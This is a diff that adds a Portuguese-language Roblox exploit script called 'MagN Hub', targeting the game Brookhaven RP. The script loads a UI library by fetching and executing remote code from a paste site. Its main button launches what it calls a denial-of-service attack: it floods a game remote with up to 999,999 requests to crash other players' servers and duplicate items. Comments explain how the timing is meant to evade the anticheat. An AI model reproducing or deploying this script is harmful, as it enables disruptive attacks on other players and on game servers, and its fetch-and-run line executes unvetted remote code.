@@ -1,0 +1,156 @@
+local Libary = loadstring(game:HttpGet("https://pastefy.app/TYVuPNOS/raw"))()
+workspace.FallenPartsDestroyHeight = -math.huge
+
+local Window = Libary:MakeWindow({
+    Title = "MagN Hub",
+    SubTitle = "Para Brookhaven RP (Hub Destrutivo)",
+    LoadText = "CHAOS ARQUIVO",
+    Flags = "chaoshub_Broookhaven"
+})
+Window:AddMinimizeButton({
+    Button = { Image = "rbxassetid://113213458632705", BackgroundTransparency = 0 },
+    Corner = { CornerRadius = UDim.new(35, 1) },
+})
+
+local InfoTab = Window:MakeTab({ Title = "Info", Icon = "rbxassetid://10723415903" })
+
+
+
+InfoTab:AddSection({ "Informações do Script" })
+InfoTab:AddParagraph({ "Owner / Developer:", "Magnesiumv2" })
+InfoTab:AddParagraph({ "Colaborações:", "ninguém" })
+InfoTab:AddParagraph({ "Você está usando:", "MagN Hub" })
+
+InfoTab:AddSection({ "Rejoin" })
+InfoTab:AddButton({
+    Name = "Rejoin",
+    Callback = function()
+        local TeleportService = game:GetService("TeleportService")
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+    end
+})
+
+local BossScript = Window:MakeTab({Title = "BruteScripts", Icon = "rbxassetid://114476297734336" })
+
+BossScript:AddSection({"Destruição de Servidor"})
+BossScript:AddButton({
+   Name = "Ataque de Negação de Serviço",
+   Description = "executa o Ataque de Sobrecarregamento do Servidor",
+   Callback = function()
+-- Evita múltiplos scripts rodando ao mesmo tempo e limpa variáveis
+local player = game:GetService("Players").LocalPlayer
+if not player then return end
+
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local starterGui = game:GetService("StarterGui")
+
+-- Função auxiliar para notificações
+local function notify(title, text)
+    pcall(function()
+        starterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Button1 = "Ok",
+            Duration = 5
+        })
+    end)
+end
+
+-- Salva a posição original de forma segura ANTES do loop
+local character = player.Character or player.CharacterAdded:Wait()
+local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+if not rootpart then 
+    notify("Erro", "HumanoidRootPart não encontrado.")
+    return 
+end
+local oldcf = rootpart.CFrame
+
+-- Cache dos remotes para máxima velocidade
+local re = replicatedStorage:FindFirstChild("RE")
+local toolRemote = re and re:FindFirstChild("1Too1l")
+
+if not toolRemote then 
+    notify("Erro", "Remote funcional não encontrado.")
+    return 
+end
+
+notify("Ataque de Negação de Serviço (DoS) Iniciado", "Aguarde os jogadores Crashar")
+
+-- Thread separada para o loop de spam (Otimizado para não estourar a memória local)
+task.spawn(function()
+    for m = 1, 999999 do -- Ajustado para evitar estouro de buffer (Buffer Overflow) no cliente
+        task.spawn(function()
+            -- Nota: Se for um RemoteFunction, InvokeServer pode travar o script se o servidor lagar.
+            if toolRemote:IsA("RemoteFunction") then
+                toolRemote:InvokeServer("PickingTools", "FireHose")
+            else
+                toolRemote:FireServer("PickingTools", "FireHose")
+            end
+        end)
+
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            local fireHose = backpack:FindFirstChild("FireHose")
+            if fireHose and fireHose:FindFirstChild("ToolSound") then
+                fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+            end
+        end
+        
+        -- Controle de taxa de envio para o servidor processar o acúmulo
+        if m % 15 == 0 then
+            task.wait(0.1)
+        end
+    end
+end)
+
+-- Aguarda o acúmulo de requisições
+task.wait(0.4)
+
+-- Aguarda a destruição do corpo antigo e recarregamento completo do novo
+player.CharacterRemoving:Wait()
+local newCharacter = player.CharacterAdded:Wait()
+local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+-- Retorna para a posição original guardada antes do reset com física estabilizada
+if newRootPart and humanoid then
+    task.wait(0.7) -- Janela de segurança ideal para o Anticheat registrar a nova ID do personagem
+    
+    -- Desativa temporariamente estados de queda para evitar detecção de velocidade
+    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+    newRootPart.CFrame = oldcf
+    
+    -- Restaura velocidade linear zerada para evitar borracha (rubberband)
+    newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+end
+
+notify("Script de Dupe", "Concluído, Equipando Itens...")
+task.wait(0.5)
+
+-- Equipar todas as FireHoses clonadas da Backpack com proteção de travamento
+local backpack = player:WaitForChild("Backpack", 10)
+if backpack then
+    local items = backpack:GetChildren()
+    local equipCount = 0
+    
+    for i = 1, #items do
+        local item = items[i]
+        if item:IsA("Tool") and item.Name == "FireHose" then
+            equipCount = equipCount + 1
+            task.defer(function()
+                item.Parent = newCharacter
+            end)
+            
+            -- Evita que a engine ignore ferramentas por excesso de troca de parent simultânea
+            if equipCount % 8 == 0 then 
+                task.wait(0.02) 
+            end 
+        end
+    end
+end
+
+task.wait(0.5)
+notify("Script de Dupe", "Finalizando processo...")
+task.wait(0.2)
+end
+})
